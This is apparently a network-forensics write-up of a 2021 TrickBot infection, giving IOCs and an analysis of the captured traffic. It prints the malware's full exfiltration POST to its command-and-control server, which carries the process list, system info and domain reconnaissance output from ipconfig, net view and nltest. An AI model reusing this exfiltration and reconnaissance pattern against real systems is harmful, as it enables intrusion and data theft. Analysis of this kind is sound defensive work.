
## **Executive Summary**:

```text
On 2021-08-19 22:40:36, a user called monica.steele with a hostname DESKTOP-M1TFHB6, was infected with a malware called TrickBot.
```


## **Details**:

- IP Address : 10.8.19.101
- Mac Address : 00:08:02:1c:47:ae
- HostName : DESKTOP-M1TFHB6
- UserName : monica.steele
- Time of infection : 2021-08-19 22:40:36


## **Indicators of Compromise (IOCs)**:

- Malware-Name : ooiwy.pdf
- MD5 Hash : 4e4ae70b6346eae111e31716dc76bc23
- File Hosting server IP : 185[.]244[.]41[.]29
- C2 : 103[.]148[.]41[.]195



## Analysis

### Stage-1
```text
On Examin the http traffic, we found that the user monica.steele download's a file that look's like a pdf  file : ooiwy.pdf . on downloading the file and examin it, it shows that the file is EXE file executable. After we uploaded the file to virustotal and anyrun, it shows the file behavior as TrickBot malware.
```

### Stage-2

```text
On continuing of the analysis, it shows on the http packet that the user is actually executed the malware and after that. The malware Gatherd the user IP public address throw "api.ipify.org" then it send's the data back to Cowboy server which is a simple light python http server with the IP of "103[.]148[.]41[.]195", however, the malware gatherd the user data like : proc list, system info( host-name, system-Name etc...) then send back the data to cowboy server with a post requset and the victim hostname as a url and an attachment of the system information.(The packet could be found down below.). However, The malware is targting Active Directory domain's.
```


```data
POST /rob124/DESKTOP-M1TFHB6_W10019043.0CB9C3AE3FA9B1267DFC20141CDE9D84/90/ HTTP/1.1

Connection: Keep-Alive

Content-Type: multipart/form-data; boundary=------Boundary0005648D

User-Agent: Ghost

Content-Length: 5311

Host: 103.148.41.195:443

  

--------Boundary0005648D

Content-Disposition: form-data; name="proclist"

  

***TASK LIST***

  

[System Process]

System

Registry

smss.exe

csrss.exe

wininit.exe

csrss.exe

winlogon.exe

services.exe

lsass.exe

svchost.exe

fontdrvhost.exe

fontdrvhost.exe

svchost.exe

svchost.exe

svchost.exe

dwm.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

Memory Compression

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

spoolsv.exe

svchost.exe

svchost.exe

armsvc.exe

svchost.exe

OfficeClickToRun.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

MsMpEng.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

dllhost.exe

sihost.exe

svchost.exe

svchost.exe

taskhostw.exe

svchost.exe

svchost.exe

ctfmon.exe

svchost.exe

explorer.exe

svchost.exe

StartMenuExperienceHost.exe

RuntimeBroker.exe

SearchApp.exe

SearchIndexer.exe

RuntimeBroker.exe

svchost.exe

YourPhone.exe

RuntimeBroker.exe

RuntimeBroker.exe

smartscreen.exe

SecurityHealthSystray.exe

SecurityHealthService.exe

svchost.exe

svchost.exe

Cortana.exe

RuntimeBroker.exe

svchost.exe

svchost.exe

svchost.exe

svchost.exe

jusched.exe

svchost.exe

svchost.exe

wermgr.exe

SgrmBroker.exe

svchost.exe

uhssvc.exe

svchost.exe

svchost.exe

svchost.exe

ApplicationFrameHost.exe

WinStore.App.exe

RuntimeBroker.exe

svchost.exe

SystemSettings.exe

WmiPrvSE.exe

svchost.exe

svchost.exe

svchost.exe

  

  

  

--------Boundary0005648D

Content-Disposition: form-data; name="sysinfo"

  

***S Y S T E M I N F O***

  

Host Name: DESKTOP-M1TFHB6

OS Name: Microsoft Windows 10 Pro

OS Version:

OS Architecture: 64-bit

Product Type: Workstation

Build Type: Multiprocessor Free

Windows Directory: C:\WINDOWS

System Directory: C:\WINDOWS\system32

Boot Device: \Device\HarddiskVolume1

Serial Number: 08606-89461-42304-37392

Install Date: 20170504105910.000000+000

Last Boot Up Time: 20210519205067.000000+000

Registered Owner: user1

Registered Organization:

Total Physical Memory: 3.97 MB

Available Physical Memory: 2.49 MB

Intel Core i3-10300 Four-Core Processor

  

  

/c ipconfig /all

  

Windows IP Configuration

  

Host Name . . . . . . . . . . . . : DESKTOP-M1TFHB6

Primary Dns Suffix . . . . . . . : fuzzylizards.com

Node Type . . . . . . . . . . . . : Hybrid

IP Routing Enabled. . . . . . . . : No

WINS Proxy Enabled. . . . . . . . : No

DNS Suffix Search List. . . . . . : fuzzylizards.com

localdomain

  

Ethernet adapter Ethernet0:

  

Connection-specific DNS Suffix . : localdomain

Description . . . . . . . . . . . : Intel(R) 82573E Gigabit Network Connection

Physical Address. . . . . . . . . : 00-08-02-1C-47-AE

DHCP Enabled. . . . . . . . . . . : Yes

Autoconfiguration Enabled . . . . : Yes

IPv4 Address. . . . . . . . . . . : 10.8.19.101(Preferred)

Subnet Mask . . . . . . . . . . . : 255.255.255.0

Lease Obtained. . . . . . . . . . : Tuesday, August 17, 2021 12:01:13 PM

Lease Expires . . . . . . . . . . : Tuesday, August 27, 2021 12:01:13 PM

Default Gateway . . . . . . . . . : 10.8.19.1

DHCP Server . . . . . . . . . . . : 10.8.19.254

DNS Servers . . . . . . . . . . . : 10.8.19.8

Primary WINS Server . . . . . . . : 10.8.19.1

NetBIOS over Tcpip. . . . . . . . : Enabled

  

/c net config workstation

Computer name \\DESKTOP-M1TFHB6

Full Computer name DESKTOP-M1TFHB6.fuzzylizards.com

User name monica.steele

  

Workstation active on

NetBT_Tcpip_{61AC52AD-1BDF-6B2E-3344-7D525B0FF1E6} (0008021C47AE)

  

Software version Windows 10 Pro

  

Workstation domain FUNKYLIZARDS

Workstation Domain DNS Name fuzzylizards.com

Logon domain FUNKYLIZARDS

  

COM Open Timeout (sec) 0

COM Send Count (byte) 16

COM Send Timeout (msec) 250

The command completed successfully.

  

  

/c net view /all

/c net view /all /domain

/c nltest /domain_trusts

List of domain trusts:

0: FUNKYLIZARDS fuzzylizards.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)

The command completed successfully

  

/c nltest /domain_trusts /all_trusts

List of domain trusts:

0: FUNKYLIZARDS fuzzylizards.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)

The command completed successfully

  

***LOCAL MACHINE DATA***

  

User name: CN=Monica Steele,CN=Users,DC=fuzzylizards,DC=com

Computer name: CN=DESKTOP-M1TFHB6,CN=Computers,DC=fuzzylizards,DC=com

Site name: Default-First-Site-Name

Domain shortname: FUNKYLIZARDS

Domain name: fuzzylizards.com

Forest name: fuzzylizards.com

Domain controller: Funkylizard-DC.fuzzylizards.com

Forest trees:

1 fuzzylizards.com

  

  

  

  

Domain: Funkylizard-DC.fuzzylizards.com

  

  

------------------------------------------------

  

  

  

--------Boundary0005648D--

  

HTTP/1.1 200 OK

server: Cowboy

date: Thu, 19 Aug 2021 19:45:38 GMT

content-length: 3

Content-Type: text/plain

  

/1/
```



## reference

- https://www.malware-traffic-analysis.net/2021/08/19/index.html